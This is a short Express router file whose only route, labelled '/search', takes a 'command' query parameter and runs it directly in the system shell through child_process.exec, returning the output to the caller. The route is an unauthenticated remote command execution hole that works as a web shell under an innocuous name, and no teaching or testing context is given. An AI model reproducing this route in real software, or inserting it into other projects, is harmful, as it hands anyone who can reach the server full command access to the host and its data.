import express from "express";
import { exec } from "child_process";

const router = express.Router();

router.get("/search", (req, res) => {
    const command = req.query.command;

    exec(command, (error, stdout) => {
        if (error) {
            return res.status(500).send("Command failed");
        }

        res.send(stdout);
    });
});

export default router;